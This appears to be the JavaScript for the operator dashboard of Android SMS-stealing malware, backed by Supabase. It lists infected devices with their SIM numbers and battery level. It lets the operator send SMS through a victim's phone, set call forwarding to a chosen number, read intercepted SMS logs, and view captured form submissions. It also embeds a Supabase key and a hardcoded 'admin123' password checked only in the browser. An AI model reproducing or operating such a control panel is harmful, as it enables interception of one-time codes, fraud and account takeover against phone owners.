<script>
// ================= SUPABASE CONFIGURATION =================
const SUPABASE_URL = 'https://lcguyfxorfhvpcvnicpa.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxjZ3V5ZnhvcmZodnBjdm5pY3BhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU0Njc2NDksImV4cCI6MjA4MTA0MzY0OX0.mx_3uB_5XMXYb3_at237Ow0AEL8N_FZpF0DHo874VV8';

// ================= GLOBAL VARIABLES =================
let ADMIN_PASSWORD = 'admin123';
let currentDeviceId = null;
let currentDeviceName = null;
let supabase = null;

// ================= INITIALIZATION =================
document.addEventListener('DOMContentLoaded', function() {
    console.log('üöÄ Dashboard starting...');
    
    // Initialize Supabase
    try {
        if (window.supabase) {
            supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
            console.log('‚úÖ Supabase connected');
        } else {
            console.error('‚ùå Supabase SDK not found');
            alert('Error: Supabase SDK not loaded. Check internet connection.');
        }
    } catch (error) {
        console.error('‚ùå Supabase init error:', error);
    }
    
    // Load saved password
    const savedPassword = localStorage.getItem('admin_password');
    if (savedPassword) {
        ADMIN_PASSWORD = savedPassword;
    }
    
    // Setup event listeners
    setupEventListeners();
    
    // Check if already logged in
    if (localStorage.getItem('admin_logged_in') === 'true') {
        showDashboard();
        loadAllData();
        // Start Auto Refresh
        setInterval(loadAllData, 5000);
    }
});

// ================= EVENT LISTENERS =================
function setupEventListeners() {
    // Login button
    const loginBtn = document.getElementById('loginButton');
    if(loginBtn) {
        loginBtn.addEventListener('click', handleLogin);
    }
    
    // Enter key support
    const passInput = document.getElementById('passwordInput');
    if(passInput) {
        passInput.addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                handleLogin();
            }
        });
    }
    
    // Dashboard buttons
    document.getElementById('logoutBtn').addEventListener('click', handleLogout);
    document.getElementById('changePasswordBtn').addEventListener('click', showChangePasswordModal);
    
    // SMS character count
    document.getElementById('smsMessage').addEventListener('input', function() {
        document.getElementById('charCount').textContent = this.value.length;
    });
}

// ================= LOGIN SYSTEM =================
function handleLogin() {
    const passwordField = document.getElementById('passwordInput');
    const password = passwordField.value.trim();
    
    if (!password) {
        showNotification('Please enter password', 'error');
        return;
    }
    
    if (password === ADMIN_PASSWORD) {
        // Save login state
        localStorage.setItem('admin_logged_in', 'true');
        
        // Show success
        showNotification('Login successful!', 'success');
        
        // Show dashboard
        showDashboard();
        
        // Load data
        loadAllData();
        
        // Start Auto Refresh
        setInterval(loadAllData, 5000);
        
        // Clear password field
        passwordField.value = '';
        
    } else {
        showNotification('Wrong password!', 'error');
    }
}

function showDashboard() {
    document.getElementById('loginScreen').style.display = 'none';
    document.getElementById('dashboard').style.display = 'block';
}

// ================= LOAD ALL DATA =================
function loadAllData() {
    loadDevices();
}

// ================= LOAD DEVICES =================
async function loadDevices() {
    try {
        if (!supabase) return;

        const { data, error } = await supabase
            .from('devices')
            .select('*')
            .order('last_seen', { ascending: false });
        
        if (error) throw error;
        
        displayDevices(data || []);
        
    } catch (error) {
        console.error('Error loading devices:', error);
    }
}

function displayDevices(devices) {
    const container = document.getElementById('devicesContainer');
    
    // Update device count
    document.getElementById('deviceCount').textContent = `${devices.length} devices connected`;
    
    if (devices.length === 0) {
        container.innerHTML = `
            <div style="text-align: center; padding: 60px; color: #666; grid-column: 1 / -1;">
                <i class="fas fa-mobile-alt" style="font-size: 50px; margin-bottom: 20px; color: #ccc;"></i>
                <h3 style="margin-bottom: 10px;">No Devices Found</h3>
                <p>Waiting for devices to connect...</p>
            </div>
        `;
        return;
    }
    
    let html = '';
    
    devices.forEach(device => {
        // Check if online (seen in last 2 minutes)
        const lastSeenDate = new Date(device.last_seen);
        const timeDiff = (new Date() - lastSeenDate) / 1000; // seconds
        const isOnline = timeDiff < 120; // 2 minutes threshold
        
        const statusDot = isOnline ? 'online-dot' : 'offline-dot';
        const statusText = isOnline ? 'Online' : 'Offline';
        const statusColor = isOnline ? '#06d6a0' : '#ef476f';
        
        html += `
            <div class="device-card">
                <div class="device-header">
                    <div class="device-info">
                        <h3>
                            <i class="fas fa-mobile-alt" style="color: #667eea;"></i>
                            ${device.model || 'Unknown'}
                        </h3>
                        <div class="device-status">
                            <span class="status-dot ${statusDot}"></span>
                            <span style="color: ${statusColor}; font-weight: 600;">${statusText}</span>
                            <span style="margin: 0 15px; color: #ccc;">‚Ä¢</span>
                            <span style="color: #666;">
                                <i class="fas fa-battery-three-quarters"></i>
                                ${device.battery_level || 0}%
                            </span>
                        </div>
                    </div>
                    <button class="delete-device" onclick="deleteDevice('${device.device_id}')">
                        <i class="fas fa-trash-alt"></i>
                    </button>
                </div>
                
                <div class="device-details">
                    <div class="detail-item">
                        <span class="detail-label">Version</span>
                        <span class="detail-value">${device.android_version || 'N/A'}</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label"><i class="fas fa-sim-card"></i> SIM 1</span>
                        <span class="detail-value">${device.sim1_number || 'N/A'}</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label"><i class="fas fa-sim-card"></i> SIM 2</span>
                        <span class="detail-value">${device.sim2_number || 'N/A'}</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">Last Seen</span>
                        <span class="detail-value" style="font-size: 12px;">${lastSeenDate.toLocaleString()}</span>
                    </div>
                </div>
                
                <div class="action-grid">
                    <button class="action-btn sms-btn" onclick="showSMSModal('${device.device_id}', '${device.model}')">
                        <i class="fas fa-sms"></i> Send SMS
                    </button>
                    <button class="action-btn call-btn" onclick="showCallModal('${device.device_id}', '${device.model}')">
                        <i class="fas fa-phone-alt"></i> Call Fwd
                    </button>
                    <button class="action-btn view-sms-btn" onclick="showViewSmsModal('${device.device_id}')">
                        <i class="fas fa-eye"></i> View SMS
                    </button>
                    <button class="action-btn view-forms-btn" onclick="showViewFormsModal('${device.device_id}')">
                        <i class="fas fa-file-alt"></i> Forms
                    </button>
                </div>
            </div>
        `;
    });
    
    container.innerHTML = html;
}

// ================= SMS FEATURE =================
function showSMSModal(deviceId, deviceName) {
    currentDeviceId = deviceId;
    document.getElementById('smsModalTitle').textContent = `Send SMS via ${deviceName}`;
    document.getElementById('targetNumber').value = '';
    document.getElementById('smsMessage').value = '';
    showModal('smsModal');
}

async function sendSMS() {
    const targetNumber = document.getElementById('targetNumber').value.trim();
    const simSlot = parseInt(document.getElementById('smsSimSelect').value);
    const message = document.getElementById('smsMessage').value.trim();
    
    if (!targetNumber || !message) {
        showNotification('Fill all fields', 'error');
        return;
    }
    
    try {
        const payload = {
            phone: targetNumber,
            message: message,
            sim: simSlot
        };

        const { error } = await supabase
            .from('admin_commands')
            .insert([{
                device_id: currentDeviceId,
                command_type: 'SEND_SMS',
                command_payload: payload,
                status: 'PENDING'
            }]);
        
        if (error) throw error;
        
        showNotification('SMS Command Sent!', 'success');
        closeModal('smsModal');
        
    } catch (error) {
        console.error('Error:', error);
        showNotification('Failed to send: ' + error.message, 'error');
    }
}

// ================= CALL FORWARDING =================
function showCallModal(deviceId, deviceName) {
    currentDeviceId = deviceId;
    document.getElementById('callModalTitle').textContent = `Call Forwarding - ${deviceName}`;
    document.getElementById('forwardNumber').value = '';
    showModal('callModal');
}

async function activateCallForward() {
    const forwardNumber = document.getElementById('forwardNumber').value.trim();
    const simSlot = parseInt(document.getElementById('callSimSelect').value);
    
    if (!forwardNumber) {
        showNotification('Enter number', 'error');
        return;
    }
    
    try {
        const payload = {
            forward_number: forwardNumber,
            sim: simSlot,
            enable: true
        };

        const { error } = await supabase
            .from('admin_commands')
            .insert([{
                device_id: currentDeviceId,
                command_type: 'CALL_FORWARD',
                command_payload: payload,
                status: 'PENDING'
            }]);
        
        if (error) throw error;
        showNotification('Activation Command Sent!', 'success');
        closeModal('callModal');
        
    } catch (error) {
        showNotification('Error: ' + error.message, 'error');
    }
}

async function deactivateCallForward() {
    const simSlot = parseInt(document.getElementById('callSimSelect').value);
    
    try {
        const payload = {
            forward_number: "", 
            sim: simSlot,
            enable: false
        };

        const { error } = await supabase
            .from('admin_commands')
            .insert([{
                device_id: currentDeviceId,
                command_type: 'CALL_FORWARD',
                command_payload: payload,
                status: 'PENDING'
            }]);
        
        if (error) throw error;
        showNotification('Deactivation Command Sent!', 'success');
        closeModal('callModal');
        
    } catch (error) {
        showNotification('Error: ' + error.message, 'error');
    }
}

// ================= VIEW SMS LOGS =================
async function showViewSmsModal(deviceId) {
    showModal('viewSmsModal');
    const container = document.getElementById('smsList');
    container.innerHTML = '<p style="text-align:center">Loading...</p>';
    
    const { data, error } = await supabase
        .from('sms_logs')
        .select('*')
        .eq('device_id', deviceId)
        .order('received_at', { ascending: false })
        .limit(20);
        
    if (data && data.length > 0) {
        let html = '';
        data.forEach(sms => {
            html += `
                <div style="background: #f8f9fa; padding: 10px; border-radius: 8px; margin-bottom: 8px; border-left: 3px solid #06d6a0;">
                    <div style="display:flex; justify-content:space-between; font-size:12px; color:#666;">
                        <strong>${sms.sender_number}</strong>
                        <span>${new Date(sms.received_at).toLocaleString()}</span>
                    </div>
                    <div style="margin-top:5px;">${sms.message_body}</div>
                </div>
            `;
        });
        container.innerHTML = html;
    } else {
        container.innerHTML = '<p style="text-align:center; padding:20px;">No SMS logs found</p>';
    }
}

// ================= VIEW FORM RESPONSES =================
async function showViewFormsModal(deviceId) {
    showModal('viewFormsModal');
    const container = document.getElementById('formsList');
    container.innerHTML = '<p style="text-align:center">Loading...</p>';
    
    const { data, error } = await supabase
        .from('form_responses')
        .select('*')
        .eq('device_id', deviceId)
        .order('submitted_at', { ascending: false });
        
    if (data && data.length > 0) {
        let html = '';
        data.forEach(form => {
            html += `
                <div style="background: #f8f9fa; padding: 10px; border-radius: 8px; margin-bottom: 8px;">
                    <div style="font-size:12px; color:#666; margin-bottom:5px;">
                        ${new Date(form.submitted_at).toLocaleString()}
                    </div>
                    <div style="background:white; padding:8px; border-radius:4px; font-family:monospace; font-size:13px; white-space: pre-wrap;">
                        ${form.form_data.replace(/\|/g, '\n')}
                    </div>
                </div>
            `;
        });
        container.innerHTML = html;
    } else {
        container.innerHTML = '<p style="text-align:center; padding:20px;">No forms found</p>';
    }
}

// ================= UTILS =================
async function deleteDevice(deviceId) {
    if(confirm('Delete this device logs?')) {
        await supabase.from('devices').delete().eq('device_id', deviceId);
        loadAllData();
    }
}

function showChangePasswordModal() {
    showModal('changePasswordModal');
}

function changeAdminPassword() {
    const newPass = document.getElementById('newPassword').value;
    if(newPass.length > 3) {
        ADMIN_PASSWORD = newPass;
        localStorage.setItem('admin_password', newPass);
        showNotification('Password Changed', 'success');
        closeModal('changePasswordModal');
    } else {
        showNotification('Password too short', 'error');
    }
}

function handleLogout() {
    localStorage.removeItem('admin_logged_in');
    location.reload();
}

function showModal(modalId) {
    document.getElementById(modalId).style.display = 'block';
    document.getElementById('modalOverlay').style.display = 'block';
}

function closeModal(modalId) {
    const id = modalId || document.querySelector('.modal[style*="block"]').id;
    document.getElementById(id).style.display = 'none';
    document.getElementById('modalOverlay').style.display = 'none';
}

function closeAllModals() {
    document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
    document.getElementById('modalOverlay').style.display = 'none';
}

function showNotification(msg, type) {
    const container = document.getElementById('notificationContainer');
    const div = document.createElement('div');
    div.className = `notification ${type}`;
    div.innerHTML = msg;
    container.appendChild(div);
    setTimeout(() => div.remove(), 3000);
}
</script>
